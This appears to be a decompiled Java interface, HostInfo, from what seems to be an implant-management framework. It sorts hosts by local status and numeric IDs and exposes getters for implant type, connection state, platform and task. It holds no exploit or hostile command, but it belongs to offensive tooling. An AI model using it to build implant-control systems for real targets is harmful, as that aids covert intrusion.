package ddb.dsz.core.host;

import ddb.dsz.core.task.TaskId;
import java.util.Calendar;
import java.util.Comparator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public interface HostInfo extends Comparable<HostInfo> {
   Comparator<HostInfo> COMPARE = new Comparator<HostInfo>() {
      Pattern CP_ID_PATTERN = Pattern.compile("z(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)");

      @Override
      public int compare(HostInfo one, HostInfo two) {
         if (one == two) {
            return 0;
         } else if (one == null) {
            return -1;
         } else if (two == null) {
            return 1;
         } else if (one.isLocal() && !two.isLocal()) {
            return -1;
         } else if (!one.isLocal() && two.isLocal()) {
            return 1;
         } else {
            Matcher var3 = this.CP_ID_PATTERN.matcher(one.getId());
            Matcher var4 = this.CP_ID_PATTERN.matcher(two.getId());
            if (var3.matches() && var4.matches() && var3.groupCount() == var4.groupCount()) {
               for(int var5 = 1; var5 < var3.groupCount() + 1; ++var5) {
                  try {
                     int var6 = Integer.parseInt(var3.group(var5));
                     int var7 = Integer.parseInt(var4.group(var5));
                     if (var6 < var7) {
                        return -1;
                     }

                     if (var6 > var7) {
                        return 1;
                     }
                  } catch (NumberFormatException var8) {
                     return 0;
                  }
               }

               return 0;
            } else {
               return 0;
            }
         }
      }
   };
   String LOCAL_HOST = "127.0.0.1";

   void copyFromHost(HostInfo hostInfo);

   String getArch();

   String getId();

   String getImplantType();

   Calendar getModifiedTime();

   String getPlatform();

   TaskId getTask();

   String getVersion();

   boolean isConnected();

   boolean isLocal();

   boolean sameHost(HostInfo hostInfo);

   void setTask(TaskId taskId);

   String getHostname();
}
